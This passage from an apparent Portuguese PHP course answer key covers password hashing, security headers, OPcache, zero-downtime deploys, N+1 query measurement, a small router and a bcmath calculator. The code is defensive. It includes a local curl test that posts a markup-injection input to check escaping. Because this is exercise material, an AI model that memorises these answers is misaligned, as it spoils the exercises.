+    echo "{$a-&gt;nome}: {$a-&gt;livros_count}\n";
+}
+
+// Autores com algum livro caro: WHERE EXISTS
+$caros = Autor::whereHas('livros', fn ($q) =&gt; $q-&gt;where('preco', '&gt;', 100))-&gt;get();
+
+// app/Providers/AppServiceProvider.php, no método boot():
+Model::preventLazyLoading(! app()-&gt;isProduction());</code></pre>
+<p>O <code>with('autor:id,nome')</code> faz uma consulta para os livros e <strong>uma</strong> para todos os autores envolvidos (<code>WHERE id IN (...)</code>), trazendo só as colunas pedidas; a chave estrangeira precisa estar entre elas. O <code>withCount</code> acrescenta a coluna <code>livros_count</code> com uma subconsulta. O <code>preventLazyLoading</code> faz qualquer acesso a uma relação não carregada lançar exceção em desenvolvimento: o N+1 é descoberto na primeira vez em que a página roda, e não pela lentidão em produção. Para ver o SQL de uma consulta, <code>-&gt;toRawSql()</code>; para todas as da página, o Laravel Debugbar ou o Telescope.</p>
+</section>
+<section class="modulo" id="modulo-9">
+<h2><span class="rotulo">MÓDULO 9</span> Segurança avançada, testes e produção</h2>
+<p class="intro">Segurança avançada, testes com PHPUnit e Pest, deploy e ambiente de produção, e desempenho.</p>
+<p class="aulas-titulo">Artigos 46 a 49</p>
+<ul class="aulas">
+<li><span class="n">#46</span> Segurança Avançada em PHP</li>
+<li><span class="n">#47</span> Testes Automatizados com PHPUnit e Pest</li>
+<li><span class="n">#48</span> Deploy e Ambiente de Produção</li>
+<li><span class="n">#49</span> Performance e Otimização</li>
+</ul>
+<h3>Perguntas conceituais — respostas</h3>
+<div class="questao" id="q62">
+<span class="num">Q62</span>
+<div class="corpo">
+<p class="titulo">Senhas</p>
+<p>Como guardar senhas em PHP? Por que <code>md5($senha)</code> e <code>sha256</code> com <em>salt</em> não servem, e o que <code>password_needs_rehash</code> resolve?</p>
+</div>
+</div>
+<p>Com <code>password_hash($senha, PASSWORD_DEFAULT)</code> e conferindo com <code>password_verify($senha, $hash)</code>. O <code>md5</code> e o SHA-256 são funções de <em>hash</em> <strong>rápidas</strong>, feitas para verificar arquivos: uma placa de vídeo testa bilhões delas por segundo, e uma senha comum vazada cai em minutos, com ou sem <em>salt</em>. O <code>password_hash</code> usa algoritmos <strong>lentos de propósito</strong> e configuráveis (bcrypt por padrão; Argon2id com <code>PASSWORD_ARGON2ID</code>), gera o <em>salt</em> sozinho e guarda algoritmo, custo e <em>salt</em> dentro da própria string. O <code>password_needs_rehash</code> informa, no momento do login (quando a senha em texto está disponível), que o <em>hash</em> guardado usa um algoritmo ou um custo antigo: o sistema gera um novo e atualiza o banco, migrando os usuários aos poucos, sem forçar ninguém a trocar a senha.</p>
+<div class="questao" id="q63">
+<span class="num">Q63</span>
+<div class="corpo">
+<p class="titulo">Cabeçalhos de segurança</p>
+<p>Cite quatro cabeçalhos HTTP de segurança que um site PHP deve enviar, e o que cada um impede.</p>
+</div>
+</div>
+<ul><li>**<code>Content-Security-Policy</code><em>*: define de onde podem vir *scripts</em>, estilos e imagens; bloqueia <em>scripts</em> injetados por XSS (<code>script-src 'self'</code> proíbe <em>scripts</em> inline e de outros domínios).</li><li>**<code>Strict-Transport-Security</code>** (HSTS): obriga o navegador a usar HTTPS no domínio por um período, impedindo o rebaixamento para HTTP numa rede hostil.</li><li>**<code>X-Content-Type-Options: nosniff</code><em>*: impede o navegador de "adivinhar" o tipo de um arquivo, e com isso de executar como *script</em> um upload que se diz imagem.</li><li>**<code>X-Frame-Options: DENY</code>** (ou <code>frame-ancestors</code> no CSP): impede que o site seja carregado num <code>&lt;iframe&gt;</code> de outro domínio, a base do <em>clickjacking</em>.</li></ul>
+<p>Também vale o <code>Referrer-Policy: strict-origin-when-cross-origin</code>, para não vazar URLs com dados para outros sites.</p>
+<div class="questao" id="q64">
+<span class="num">Q64</span>
+<div class="corpo">
+<p class="titulo">OPcache e o preload</p>
+<p>O que o OPcache faz, e por que, em produção, <code>opcache.validate_timestamps=0</code> dá desempenho mas exige cuidado no deploy?</p>
+</div>
+</div>
+<p>Sem OPcache, o PHP lê e compila cada arquivo em todas as requisições. O OPcache guarda o resultado da compilação (os <em>opcodes</em>) na memória compartilhada, e as requisições seguintes pulam a leitura e a compilação: costuma ser o maior ganho de desempenho de uma aplicação PHP, sem mudar uma linha. Com <code>validate_timestamps=1</code>, ele ainda confere a data de cada arquivo de tempos em tempos para saber se mudou. Com <code>0</code>, nunca confere: é mais rápido, mas um deploy que só copia arquivos novos continua executando a versão <strong>antiga</strong> guardada na memória. O deploy precisa então recarregar o PHP-FPM (<code>systemctl reload php8.5-fpm</code>) ou limpar o cache. O <em>preload</em> (<code>opcache.preload</code>) vai além e carrega classes do <em>framework</em> uma vez, na partida do servidor.</p>
+<div class="questao" id="q65">
+<span class="num">Q65</span>
+<div class="corpo">
+<p class="titulo">Deploy sem tempo fora do ar</p>
+<p>Descreva um deploy de uma aplicação PHP que não deixa o site fora do ar nem pela metade (código novo com dependências velhas). O que é a troca atômica de <em>symlink</em>?</p>
+</div>
+</div>
+<p>Cada versão vai para uma pasta própria (<code>releases/2026-10-20-1430/</code>). Nela, o deploy baixa o código da <em>tag</em>, roda <code>composer install --no-dev --optimize-autoloader</code>, liga os arquivos compartilhados (<code>.env</code>, <code>storage/</code>, <em>uploads</em>) por <em>symlinks</em> para <code>shared/</code>, e aplica as <em>migrations</em> compatíveis com a versão anterior. Só no fim, o <em>symlink</em> <code>current</code> (que é a raiz do servidor web) passa a apontar para a pasta nova, com <code>ln -sfn</code> seguido de <code>mv -T</code>, uma operação <strong>atômica</strong>: nenhuma requisição vê metade de uma versão. Depois, recarrega-se o PHP-FPM, por causa do OPcache. Voltar à versão anterior é apontar o <em>symlink</em> de volta. Ferramentas como o Deployer automatizam exatamente esse roteiro.</p>
+<h3>Exercícios de código — respostas</h3>
+<div class="questao" id="q66">
+<span class="num">Q66</span>
+<div class="corpo">
+<p class="titulo">Senhas com password_hash</p>
+<p>Escreva o fluxo de cadastro e login: gere o <em>hash</em> de uma senha com <code>PASSWORD_DEFAULT</code> e custo 10, mostre o formato do <em>hash</em>, verifique uma senha certa e uma errada, e use <code>password_needs_rehash</code> para migrar o <em>hash</em> quando o custo exigido sobe para 12.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+$senha = 'correto-cavalo-bateria-grampo';
+$hash = password_hash($senha, PASSWORD_DEFAULT, ['cost' =&gt; 10]);
+echo "formato: ", substr($hash, 0, 7), "... (", strlen($hash), " caracteres)\n";
+echo "outro hash da mesma senha é diferente? ", password_hash($senha, PASSWORD_DEFAULT, ['cost' =&gt; 10]) !== $hash ? 'sim' : 'não', "\n";
+
+foreach ([$senha, 'Correto-cavalo-bateria-grampo'] as $tentativa) {
+    echo "login com \"", substr($tentativa, 0, 8), "...\": ", password_verify($tentativa, $hash) ? 'ok' : 'senha incorreta', "\n";
+}
+
+$opcoesNovas = ['cost' =&gt; 12];
+if (password_verify($senha, $hash) &amp;&amp; password_needs_rehash($hash, PASSWORD_DEFAULT, $opcoesNovas)) {
+    $hash = password_hash($senha, PASSWORD_DEFAULT, $opcoesNovas);
+    echo "hash atualizado no login: ", substr($hash, 0, 7), "...\n";
+}
+echo "precisa de novo rehash? ", password_needs_rehash($hash, PASSWORD_DEFAULT, $opcoesNovas) ? 'sim' : 'não', "\n";</code></pre>
+<pre class="saida"><code>formato: $2y$10$... (60 caracteres)
+outro hash da mesma senha é diferente? sim
+login com "correto-...": ok
+login com "Correto-...": senha incorreta
+hash atualizado no login: $2y$12$...
+precisa de novo rehash? não</code></pre>
+<p>O prefixo <code>$2y$10$</code> diz o algoritmo (bcrypt) e o custo (2¹⁰ rodadas); o <em>salt</em> e o <em>hash</em> vêm em seguida, na mesma string, por isso a coluna no banco não precisa de mais nada (o recomendado é <code>VARCHAR(255)</code>, para caber algoritmos futuros). Dois <em>hashes</em> da mesma senha são diferentes porque o <em>salt</em> é sorteado a cada vez, e o <code>password_verify</code> o lê do próprio <em>hash</em>. Cada aumento de 1 no custo dobra o tempo de cálculo: o ajuste certo é o maior custo que o servidor aguenta num login (algo como 100 a 300 ms).</p>
+<div class="questao" id="q67">
+<span class="num">Q67</span>
+<div class="corpo">
+<p class="titulo">Medindo o N+1</p>
+<p>Com SQLite em memória, crie 200 pedidos de 50 clientes e meça, com <code>hrtime</code>, duas formas de listar os pedidos com o nome do cliente: uma consulta para os pedidos e uma por pedido para o cliente (N+1), e uma consulta com <code>JOIN</code>. Mostre o número de consultas de cada forma e qual foi mais rápida.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+$pdo = new PDO('sqlite::memory:', options: [PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION]);
+$pdo-&gt;exec("CREATE TABLE clientes (id INTEGER PRIMARY KEY, nome TEXT);
+            CREATE TABLE pedidos (id INTEGER PRIMARY KEY, cliente_id INTEGER, total INTEGER)");
+$pdo-&gt;beginTransaction();
+for ($c = 1; $c &lt;= 50; $c++) {
+    $pdo-&gt;exec("INSERT INTO clientes VALUES ($c, 'Cliente $c')");
+}
+for ($p = 1; $p &lt;= 200; $p++) {
+    $pdo-&gt;exec("INSERT INTO pedidos VALUES ($p, " . (($p % 50) + 1) . ", " . ($p * 100) . ")");
+}
+$pdo-&gt;commit();
+
+function nMaisUm(PDO $pdo): array
+{
+    $consultas = 1;
+    $linhas = [];
+    $cli = $pdo-&gt;prepare("SELECT nome FROM clientes WHERE id = ?");
+    foreach ($pdo-&gt;query("SELECT id, cliente_id FROM pedidos") as $ped) {
+        $cli-&gt;execute([$ped['cliente_id']]);
+        $consultas++;
+        $linhas[] = [$ped['id'], $cli-&gt;fetchColumn()];
+    }
+    return [$linhas, $consultas];
+}
+
+function comJoin(PDO $pdo): array
+{
+    $linhas = $pdo-&gt;query("SELECT p.id, c.nome FROM pedidos p JOIN clientes c ON c.id = p.cliente_id ORDER BY p.id")
+        -&gt;fetchAll(PDO::FETCH_NUM);
+    return [$linhas, 1];
+}
+
+foreach (['N+1' =&gt; 'nMaisUm', 'JOIN' =&gt; 'comJoin'] as $nome =&gt; $f) {
+    $melhor = PHP_INT_MAX;
+    for ($i = 0; $i &lt; 20; $i++) {  // repete e fica com o melhor tempo, para reduzir o ruído
+        $t = hrtime(true);
+        [$linhas, $consultas] = $f($pdo);
+        $melhor = min($melhor, hrtime(true) - $t);
+    }
+    $tempos[$nome] = $melhor;
+    echo "$nome: ", count($linhas), " linhas em $consultas consulta(s)\n";
+}
+echo "o JOIN foi mais rápido? ", $tempos['JOIN'] &lt; $tempos['N+1'] ? 'sim' : 'não', "\n";</code></pre>
+<pre class="saida"><code>N+1: 200 linhas em 201 consulta(s)
+JOIN: 200 linhas em 1 consulta(s)
+o JOIN foi mais rápido? sim</code></pre>
+<p>Os tempos exatos mudam de máquina para máquina, por isso a saída só compara. E aqui o banco está <strong>na memória do próprio processo</strong>: cada consulta custa microssegundos. Com MySQL ou PostgreSQL num servidor, cada consulta paga também uma ida e volta pela rede (de 0,1 a 1 ms numa rede local), e as 201 consultas do N+1 viram dezenas ou centenas de milissegundos por página. O <code>hrtime(true)</code> devolve nanossegundos de um relógio monotônico, que não volta para trás quando o relógio do sistema é ajustado, ao contrário do <code>microtime</code>.</p>
+<div class="questao" id="q68">
+<span class="num">Q68</span>
+<div class="corpo">
+<p class="titulo">Cabeçalhos de segurança num middleware</p>
+<p>Escreva uma função <code>comCabecalhosDeSeguranca(callable $controlador): callable</code> que envolva qualquer controlador e acrescente os cabeçalhos de segurança à resposta, e um <code>seguranca.php</code> que a use. Confira os cabeçalhos com <code>curl -I</code> pelo servidor embutido.</p>
+</div>
+</div>
+<p><code>seguranca.php</code>:</p>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+function comCabecalhosDeSeguranca(callable $controlador): callable
+{
+    return function () use ($controlador): void {
+        header("Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'none'");
+        header('X-Content-Type-Options: nosniff');
+        header('Referrer-Policy: strict-origin-when-cross-origin');
+        header('Strict-Transport-Security: max-age=31536000; includeSubDomains');  // só tem efeito via HTTPS
+        header_remove('X-Powered-By');  // não anuncia a versão do PHP
+        $controlador();
+    };
+}
+
+$pagina = comCabecalhosDeSeguranca(function (): void {
+    echo "&lt;h1&gt;Livraria&lt;/h1&gt;";
+});
+$pagina();</code></pre>
+<pre class="codigo"><code>php -S 127.0.0.1:8794 &gt;/dev/null 2&gt;&amp;1 &amp;
+servidor=$!
+sleep 1
+curl -s -I http://127.0.0.1:8794/seguranca.php | grep -iE '^(content-security|x-content|referrer|strict-transport|x-powered)' | tr -d '\r' | sort
+kill $servidor</code></pre>
+<pre class="saida"><code>Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'none'
+Referrer-Policy: strict-origin-when-cross-origin
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff</code></pre>
+<p>O <code>X-Powered-By</code> não aparece: foi removido (ou desligue no <code>php.ini</code> com <code>expose_php = Off</code>, que vale para tudo). Envolver o controlador numa função que acrescenta comportamento antes e depois é a ideia dos <em>middlewares</em> da PSR-15 e do Laravel. Em produção, esses cabeçalhos costumam ser definidos no próprio servidor web (nginx ou Apache), para valerem também para arquivos estáticos. O HSTS só deve ser ligado quando <strong>todo</strong> o domínio funcionar em HTTPS: o navegador vai se recusar a usar HTTP por um ano.</p>
+</section>
+<section class="modulo" id="modulo-10">
+<h2><span class="rotulo">MÓDULO 10</span> Projeto final</h2>
+<p class="intro">Planejamento e arquitetura, implementação, testes, deploy e encerramento.</p>
+<p class="aulas-titulo">Artigos 50 a 52</p>
+<ul class="aulas">
+<li><span class="n">#50</span> Projeto Final Parte 1: Planejamento e Arquitetura</li>
+<li><span class="n">#51</span> Projeto Final Parte 2: Implementação</li>
+<li><span class="n">#52</span> Projeto Final Parte 3: Testes, Deploy e Encerramento</li>
+</ul>
+<h3>Perguntas conceituais — respostas</h3>
+<div class="questao" id="q69">
+<span class="num">Q69</span>
+<div class="corpo">
+<p class="titulo">Do requisito ao plano</p>
+<p>Antes de escrever código do projeto final, que decisões o artigo #50 manda tomar e registrar? Por que escrever essas decisões, mesmo num projeto pessoal?</p>
+</div>
+</div>
+<p>O escopo (o que a primeira versão faz e, tão importante quanto, o que <strong>não</strong> faz), as entidades e as regras de negócio, o esquema do banco, a arquitetura (camadas, pastas e responsabilidades), as rotas, a estratégia de testes e o plano de deploy. Escrever essas decisões, com o motivo de cada uma (um ADR curto, como "usamos PDO puro em vez de Eloquent porque..."), evita rediscutir o mesmo assunto a cada semana, ajuda quem chega depois (inclusive você daqui a seis meses) a entender por que o código é como é, e torna visível quando uma mudança de escopo está acontecendo. Num projeto pessoal, o leitor mais provável dessas notas é você mesmo, retomando o projeto depois de uma pausa.</p>
+<div class="questao" id="q70">
+<span class="num">Q70</span>
+<div class="corpo">
+<p class="titulo">Uma lista de verificação antes do deploy</p>
+<p>Monte uma lista de verificação curta para colocar o projeto final em produção, cobrindo configuração, segurança, banco e operação.</p>
+</div>
+</div>
+<ul><li><strong>Configuração</strong>: <code>APP_DEBUG=false</code>; segredos só em variáveis de ambiente, com o <code>.env</code> fora do repositório e um <code>.env.example</code> sem valores reais; <code>display_errors=Off</code> e <code>log_errors=On</code>.</li><li><strong>Segurança</strong>: HTTPS com redirecionamento e HSTS; cabeçalhos de segurança; <em>cookies</em> com <code>Secure</code>, <code>HttpOnly</code> e <code>SameSite</code>; <em>rate limit</em> no login e nos formulários públicos; <em>uploads</em> fora da raiz pública; <code>composer audit</code> sem vulnerabilidades.</li><li><strong>Banco</strong>: usuário da aplicação com permissões mínimas (sem <code>DROP</code>); <em>migrations</em> aplicadas e testadas numa cópia; <em>backup</em> automático <strong>testado</strong> (um <em>backup</em> que nunca foi restaurado não é um <em>backup</em>).</li><li><strong>Desempenho</strong>: OPcache ligado, <code>composer install --no-dev -o</code>.</li><li><strong>Operação</strong>: <em>logs</em> com rotação; monitoramento de disponibilidade e de erros; uma rota <code>/health</code>; plano de rollback (o <em>symlink</em> anterior).</li><li><strong>Qualidade</strong>: a suíte de testes passando no CI antes do deploy.</li></ul>
+<h3>Exercícios de código — respostas</h3>
+<div class="questao" id="q71">
+<span class="num">Q71</span>
+<div class="corpo">
+<p class="titulo">Um roteador mínimo</p>
+<p>O projeto final usa um roteador próprio, como este site. Escreva <code>final class Roteador</code> com <code>get</code> e <code>post</code> que aceitem padrões com parâmetros (<code>/livros/{id}</code>), convertidos para expressões regulares, e um <code>despachar(string $metodo, string $caminho)</code> que chame o controlador com os parâmetros nomeados, ou devolva 404 e 405 (método não permitido, com a lista dos aceitos). Mostre a importância da ordem das rotas com <code>/livros/novo</code> e <code>/livros/{id}</code>.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+final class Roteador
+{
+    /** @var list&lt;array{string, string, Closure}&gt; */
+    private array $rotas = [];
+
+    public function get(string $padrao, Closure $acao): void { $this-&gt;rotas[] = ['GET', $padrao, $acao]; }
+    public function post(string $padrao, Closure $acao): void { $this-&gt;rotas[] = ['POST', $padrao, $acao]; }
+
+    public function despachar(string $metodo, string $caminho): string
+    {
+        $permitidos = [];
+        foreach ($this-&gt;rotas as [$m, $padrao, $acao]) {
+            $regex = '#^' . preg_replace('#\{(\w+)\}#', '(?P&lt;$1&gt;[^/]+)', $padrao) . '$#';
+            if (!preg_match($regex, $caminho, $achou)) {
+                continue;
+            }
+            if ($m !== $metodo) {
+                $permitidos[] = $m;
+                continue;
+            }
+            $params = array_filter($achou, 'is_string', ARRAY_FILTER_USE_KEY);  // só os grupos nomeados
+            return $acao(...$params);  // array com chaves de texto vira argumentos nomeados
+        }
+        return $permitidos ? "405 (permitidos: " . implode(', ', array_unique($permitidos)) . ")" : '404';
+    }
+}
+
+$r = new Roteador();
+$r-&gt;get('/livros/novo', fn() =&gt; 'formulário de novo livro');  // antes do {id}, senão "novo" vira um id
+$r-&gt;get('/livros/{id}', fn(string $id) =&gt; "livro $id");
+$r-&gt;post('/livros', fn() =&gt; 'livro criado');
+$r-&gt;get('/{categoria}/{slug}', fn(string $categoria, string $slug) =&gt; "artigo '$slug' em $categoria");
+
+foreach ([['GET', '/livros/novo'], ['GET', '/livros/42'], ['POST', '/livros'], ['GET', '/livros'],
+          ['GET', '/php/funcoes'], ['DELETE', '/livros/42'], ['GET', '/a/b/c']] as [$m, $c]) {
+    printf("%-6s %-14s -&gt; %s\n", $m, $c, $r-&gt;despachar($m, $c));
+}</code></pre>
+<pre class="saida"><code>GET    /livros/novo   -&gt; formulário de novo livro
+GET    /livros/42     -&gt; livro 42
+POST   /livros        -&gt; livro criado
+GET    /livros        -&gt; 405 (permitidos: POST)
+GET    /php/funcoes   -&gt; artigo 'funcoes' em php
+DELETE /livros/42     -&gt; 405 (permitidos: GET)
+GET    /a/b/c         -&gt; 404</code></pre>
+<p>A primeira rota que casa vence: se <code>/livros/{id}</code> viesse antes, <code>/livros/novo</code> mostraria "livro novo". É a mesma regra deste site, que mantém as rotas <em>catch-all</em> (<code>/{categoria}/{slug}</code>) por último. O <code>GET /livros</code> deu 405 porque só existe o <code>POST</code> nesse caminho: responder 404 seria mentir sobre a existência do recurso. Passar <code>...$params</code> com chaves de texto usa os argumentos nomeados do PHP 8: os nomes dos grupos da expressão regular precisam bater com os nomes dos parâmetros da função.</p>
+</section>
+<section class="modulo" id="desafios">
+<h2><span class="rotulo">PARA IR ALÉM</span> Desafios integradores</h2>
+<p class="intro">Projetos maiores, que juntam vários módulos. Não há uma única resposta certa: o gabarito mostra um caminho.</p>
+<div class="questao desafio" id="d1">
+<span class="num">D1</span>
+<div class="corpo">
+<p class="titulo">Uma calculadora, duas interfaces</p>
+<p>Escreva uma calculadora com sete operações: soma, subtração, multiplicação, divisão, potência (expoente inteiro), porcentagem (<code>15 % 200</code> é 15% de 200) e raiz quadrada (<code>raiz 2</code>). Ela deve: (a) aceitar vírgula ou ponto como separador decimal; (b) guardar o último resultado em <code>ans</code>, utilizável na conta seguinte; (c) recusar divisão por zero, raiz de negativo, expoente fracionário e texto que não é número com uma mensagem clara, <strong>sem encerrar o programa</strong>; (d) ter os comandos <code>hist</code> (histórico) e <code>sair</code> no terminal. O mesmo núcleo (<code>Calculadora.php</code>) deve servir a duas interfaces: um programa de terminal (<code>cli.php</code>) e uma página web (<code>web.php</code>), que guarda o <code>ans</code> e o histórico na sessão. Use a extensão <code>bcmath</code> para que <code>0,1 + 0,2</code> dê exatamente <code>0,3</code>.</p>
+</div>
+</div>
+<p><strong>Caminho da solução</strong></p>
+<ul><li><strong>Núcleo</strong>: a classe <code>Calculadora</code> recebe a linha e devolve o resultado como <strong>string decimal</strong> (o formato do <code>bcmath</code>), ou lança <code>CalculadoraException</code> com a mensagem para o usuário. Ela não faz <code>echo</code> nem lê nada: é usada igualmente pelo terminal, pela página e por testes.</li><li><strong>Números</strong>: com o <code>bcmath</code>, os números são strings com uma escala fixa (aqui, 10 casas), e as contas são exatas em decimal. A raiz usa <code>bcsqrt</code>, também com 10 casas. Os zeros à direita são removidos só na exibição.</li><li><strong>Terminal</strong>: lê com <code>fgets(STDIN)</code>, mantém o histórico num array.</li><li><strong>Web</strong>: um formulário <code>POST</code> com o campo da conta, <em>token</em> CSRF e PRG, como no módulo 7; o <code>ans</code> e o histórico ficam em <code>$_SESSION</code>, e cada valor exibido passa por <code>htmlspecialchars</code>.</li></ul>
+<p><code>Calculadora.php</code>:</p>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+final class CalculadoraException extends RuntimeException {}
+
+final class Calculadora
+{
+    private const ESCALA = 10;
+
+    public function __construct(public private(set) string $ans = '0') {}
+
+    /** Avalia "12,5 + 3", "2 ^ 10", "15 % 200" ou "raiz 2" e devolve o resultado como string decimal. */
+    public function avaliar(string $linha): string
+    {
+        $p = preg_split('/\s+/', trim($linha), flags: PREG_SPLIT_NO_EMPTY);
+        $r = match (true) {
+            count($p) === 2 &amp;&amp; $p[0] === 'raiz' =&gt; $this-&gt;raiz($this-&gt;numero($p[1])),
+            count($p) === 3 =&gt; $this-&gt;operar($p[1], $this-&gt;numero($p[0]), $this-&gt;numero($p[2])),
+            default =&gt; throw new CalculadoraException('use "a op b" ou "raiz a"'),
+        };
+        return $this-&gt;ans = $r;  // só chega aqui se não houve erro
+    }
+
+    private function numero(string $texto): string
+    {
+        if ($texto === 'ans') {
+            return $this-&gt;ans;
+        }
+        $t = str_replace(',', '.', $texto);
+        if (!preg_match('/^-?\d+(\.\d+)?$/', $t)) {
+            throw new CalculadoraException("\"$texto\" não é um número");
+        }
+        return $t;
+    }
+
+    private function raiz(string $x): string
+    {
+        if (bccomp($x, '0', self::ESCALA) &lt; 0) {
+            throw new CalculadoraException('raiz de número negativo');
+        }
+        return bcsqrt($x, self::ESCALA);
+    }
+
+    private function operar(string $op, string $a, string $b): string
+    {
+        return match ($op) {
+            '+' =&gt; bcadd($a, $b, self::ESCALA),
+            '-' =&gt; bcsub($a, $b, self::ESCALA),
+            '*' =&gt; bcmul($a, $b, self::ESCALA),
+            '/' =&gt; bccomp($b, '0', self::ESCALA) === 0
+                ? throw new CalculadoraException('divisão por zero')
+                : bcdiv($a, $b, self::ESCALA),
+            '%' =&gt; bcdiv(bcmul($a, $b, self::ESCALA), '100', self::ESCALA),
+            '^' =&gt; $this-&gt;potencia($a, $b),
+            default =&gt; throw new CalculadoraException("operação desconhecida \"$op\" (use + - * / ^ % ou raiz)"),
+        };
+    }
+
+    private function potencia(string $a, string $b): string
+    {
+        if (!preg_match('/^-?\d+(\.0+)?$/', $b)) {
+            throw new CalculadoraException('o expoente precisa ser inteiro');
+        }
+        if (abs((int) $b) &gt; 1000) {
+            throw new CalculadoraException('expoente grande demais');
+        }
+        return bcpow($a, (string) (int) $b, self::ESCALA);
+    }
+
+    /** Para exibir: vírgula decimal e sem zeros à direita. */
+    public static function formatar(string $valor): string
+    {
+        if (str_contains($valor, '.')) {
+            $valor = rtrim(rtrim($valor, '0'), '.');
+        }
+        return str_replace('.', ',', $valor === '-0' ? '0' : $valor);
+    }
+}</code></pre>
+<p><code>cli.php</code>:</p>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+require __DIR__ . '/Calculadora.php';
+
+$calc = new Calculadora();
+$historico = [];
+echo "Calculadora: + - * / ^ % e raiz. Comandos: hist, sair.\n";
+while (true) {
+    echo '&gt; ';
+    $linha = fgets(STDIN);
+    if ($linha === false || trim($linha) === 'sair') {
+        break;
+    }
+    $linha = trim($linha);
+    if ($linha === 'hist') {
+        foreach ($historico as $i =&gt; $h) {
+            echo '  ', $i + 1, ". $h\n";
+        }
+        continue;
+    }
+    if ($linha === '') {
+        continue;
+    }
+    try {
+        $historico[] = "$linha = " . Calculadora::formatar($calc-&gt;avaliar($linha));
+        echo end($historico), "\n";
+    } catch (CalculadoraException $e) {
+        echo "erro: {$e-&gt;getMessage()}\n";
+    }
+}</code></pre>
+<p class="rotulo-entrada">Entrada digitada:</p>
+<pre class="codigo"><code>2 + 3
+0,1 + 0,2
+ans * 10
+10 / 0
+2 ^ 0,5
+raiz -4
+raiz 2
+ans * ans
+10 / 3
+15 % 200
+abc + 1
+2 ^ 100
+2 $ 3
+hist
+sair</code></pre>
+<pre class="saida"><code>Calculadora: + - * / ^ % e raiz. Comandos: hist, sair.
+&gt; 2 + 3 = 5
+&gt; 0,1 + 0,2 = 0,3
+&gt; ans * 10 = 3
+&gt; erro: divisão por zero
+&gt; erro: o expoente precisa ser inteiro
+&gt; erro: raiz de número negativo
+&gt; raiz 2 = 1,4142135623
+&gt; ans * ans = 1,9999999997
+&gt; 10 / 3 = 3,3333333333
+&gt; 15 % 200 = 30
+&gt; erro: "abc" não é um número
+&gt; 2 ^ 100 = 1267650600228229401496703205376
+&gt; erro: operação desconhecida "$" (use + - * / ^ % ou raiz)
+&gt;   1. 2 + 3 = 5
+  2. 0,1 + 0,2 = 0,3
+  3. ans * 10 = 3
+  4. raiz 2 = 1,4142135623
+  5. ans * ans = 1,9999999997
+  6. 10 / 3 = 3,3333333333
+  7. 15 % 200 = 30
+  8. 2 ^ 100 = 1267650600228229401496703205376
+&gt;</code></pre>
+<p>Com a entrada redirecionada, o terminal não ecoa o que foi digitado, e cada resposta aparece logo depois do <code>&gt;</code>.</p>
+<p>O <code>bcmath</code> faz <code>0,1 + 0,2</code> dar exatamente 0,3, sem truque de impressão, e <code>2 ^ 100</code> com todos os 31 dígitos (com <code>float</code>, seriam só uns 16 certos). O preço é a <strong>escala fixa</strong>: <code>10 / 3</code> para na décima casa, e a raiz de 2 também; por isso <code>ans * ans</code> dá 1,9999999997, e não 2 (o quadrado de 1,4142135623 truncado de novo em 10 casas). Escolher a escala é uma decisão do problema: dinheiro precisa de 2 casas (e de uma regra de arredondamento explícita, porque o <code>bcmath</code> <strong>trunca</strong>); uma calculadora científica, de mais.</p>
+<p>A versão web reaproveita o núcleo sem mudar uma linha. O <code>ans</code> vive na sessão, porque cada requisição começa do zero (o "<em>shared nothing</em>" do módulo 1):</p>
+<p><code>web.php</code>:</p>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+require __DIR__ . '/Calculadora.php';
+session_start(['cookie_httponly' =&gt; true, 'cookie_samesite' =&gt; 'Lax']);
+$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
+$_SESSION['hist'] ??= [];
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (!hash_equals($_SESSION['csrf'], (string) ($_POST['csrf'] ?? ''))) {
+        http_response_code(403);
+        exit('token CSRF inválido');
+    }
+    $calc = new Calculadora($_SESSION['ans'] ?? '0');
+    $conta = trim((string) ($_POST['conta'] ?? ''));
+    try {
+        $_SESSION['hist'][] = "$conta = " . Calculadora::formatar($calc-&gt;avaliar($conta));
+        $_SESSION['ans'] = $calc-&gt;ans;
+        unset($_SESSION['erro']);
+    } catch (CalculadoraException $e) {
+        $_SESSION['erro'] = $e-&gt;getMessage();
+    }
+    header('Location: /web.php', response_code: 303);
+    exit;
+}
+
+$e = fn(string $s): string =&gt; htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+$erro = $_SESSION['erro'] ?? null;
+unset($_SESSION['erro']);
+?&gt;
+&lt;!doctype html&gt;
+&lt;html lang="pt-BR"&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;title&gt;Calculadora&lt;/title&gt;
+&lt;form method="post"&gt;
+  &lt;input type="hidden" name="csrf" value="&lt;?= $e($_SESSION['csrf']) ?&gt;"&gt;
+  &lt;input name="conta" placeholder="ex.: 12,5 * 3 ou raiz 2" autofocus&gt;
+  &lt;button&gt;=&lt;/button&gt;
+&lt;/form&gt;
+&lt;?php if ($erro): ?&gt;&lt;p class="erro"&gt;&lt;?= $e($erro) ?&gt;&lt;/p&gt;&lt;?php endif ?&gt;
+&lt;ol&gt;
+&lt;?php foreach (array_reverse($_SESSION['hist']) as $h): ?&gt;
+  &lt;li&gt;&lt;?= $e($h) ?&gt;&lt;/li&gt;
+&lt;?php endforeach ?&gt;
+&lt;/ol&gt;</code></pre>
+<pre class="codigo"><code>php -S 127.0.0.1:8795 &gt;/dev/null 2&gt;&amp;1 &amp;
+servidor=$!
+sleep 1
+url=http://127.0.0.1:8795/web.php
+jar=cookies.txt
+token=$(curl -s -c $jar $url | grep -o 'name="csrf" value="[0-9a-f]*' | cut -d'"' -f4)
+for conta in "0,1 + 0,2" "ans * 10" "10 / 0" "&lt;b&gt;1&lt;/b&gt; + 1"; do
+  curl -s -b $jar -o /dev/null --data-urlencode "csrf=$token" --data-urlencode "conta=$conta" $url
+done
